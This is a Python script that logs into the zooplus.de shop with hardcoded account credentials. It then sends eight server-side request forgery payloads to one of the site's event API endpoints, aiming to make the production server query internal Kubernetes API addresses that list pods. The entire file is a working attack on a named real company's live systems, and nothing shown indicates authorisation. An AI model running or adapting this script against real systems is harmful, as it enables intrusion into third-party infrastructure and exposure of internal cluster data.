#!/usr/bin/env python3
"""Test different SSRF request formats"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

# LOGIN
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"
k8s_url = "https://kubernetes.default.svc/api/v1/namespaces/default/pods"

print("[*] Testing different SSRF request formats...\n")

# Format 1: Simple url
print("[1] Format: {'url': '...'}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": k8s_url}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 2: endpoint
print("\n[2] Format: {'endpoint': '...'}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"endpoint": k8s_url}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 3: target
print("\n[3] Format: {'target': '...'}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"target": k8s_url}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 4: callback
print("\n[4] Format: {'callback': '...'}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"callback": k8s_url}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 5: Nested
print("\n[5] Format: {'request': {'url': '...'}}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"request": {"url": k8s_url}}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 6: With method
print("\n[6] Format: {'url': '...', 'method': 'GET'}")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": k8s_url, "method": "GET"}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 7: Try with 10.96.0.1
print("\n[7] Testing with 10.96.0.1 (ClusterIP)...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": "https://10.96.0.1/api/v1/namespaces/default/pods"}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

# Format 8: Try with http://
print("\n[8] Testing with http:// (no SSL)...")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={"url": "http://kubernetes.default.svc/api/v1/namespaces/default/pods"}, timeout=5, verify=False)
    print(f"  Status: {resp.status_code}, Response: {resp.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n[*] Done!")

